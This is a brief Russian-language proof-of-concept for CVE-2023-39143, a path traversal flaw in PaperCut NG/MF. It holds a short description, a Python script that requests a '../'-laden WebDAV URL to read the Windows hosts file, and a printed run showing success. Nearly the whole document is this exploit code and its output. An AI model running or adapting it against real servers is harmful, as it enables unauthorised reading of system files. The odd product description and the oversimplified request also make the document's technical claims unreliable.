##Описание уязвимости:##

CVE-2023-39143 – это уязвимость обхода пути (Path Traversal) в бумажно-бюджетной системе PaperCut NG/MF (Windows),
которая позволяет злоумышленнику загружать, читать или удалять произвольные файлы на сервере

##PoC-скрипт##

import requests

target = "http://example.com/webdav/../../../../windows/system32/drivers/etc/hosts"

try:
    resp = requests.get(target, timeout=6)
except requests.RequestException as e:
    print("[-] Ошибка при отправке запроса:", e)
else:
    if resp.status_code == 200:
        print("[+] Потенциальная уязвимость обнаружена. Сервер вернул содержимое (показаны первые 300 символов):")
        print(resp.text[:300])
    else:
        print("[-] Вопрос к уязвимости не подтвердился. Код ответа:", resp.status_code)

##Результат выполнения:##

[+] Потенциальная уязвимость обнаружена. Сервер вернул содержимое (показаны первые 300 символов):
# localhost name resolution is handled within DNS ...
